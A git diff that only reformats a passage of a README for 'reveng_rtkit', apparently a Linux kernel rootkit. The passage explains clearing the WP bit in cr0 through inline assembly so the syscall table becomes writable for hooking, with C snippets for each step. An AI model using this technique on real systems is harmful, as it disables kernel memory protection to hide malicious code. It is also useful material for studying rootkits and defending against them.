@@ -873,25 +873,26 @@ Now, we can export both `kallsyms_lookup_name` as well as `sys_call_table`! :win
          According to [change-value-of-wp-bit-in-cr0](https://hadfiabdelmoumene.medium.com/change-value-of-wp-bit-in-cr0-when-cr0-is-panned-45a12c7e8411):
          As we are already in ring-0 ,i.e. in kernel mode, we already can write directly to cr0 registry and we don’t need to call write_cr0() function.
          We will be using ***this function*** to **write in cr0 register** instead of standard `write_cr0() function`.
-         
+&nbsp;    
          Here, `__force_order` is used to force instruction serialization.
-          ```c
+```c
           static inline void write_cr0_forced(unsigned long val)
           {
             unsigned long __force_order;
 
             asm volatile("mov %0, %%cr0" : "+r"(val), "+m"(__force_order));
           }
-          ```
+```
+&nbsp;
       3. Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L323)
       Now, we will be using this function, `write_cr0_forced` to set WP flag to zero in cr0 register.
-          ```c
+```c
           static inline void unprotect_memory(void)
           {
             pr_info("[*] reveng_rtkit: (Memory unprotected): Ready for editing Syscall Table");
             write_cr0_forced(cr0 & ~0x00010000);    // Setting WP flag to 0 => writable
           }
-          ```
+```
 
       #### Step3: <ins>Performing the actual hooking</ins>.
 
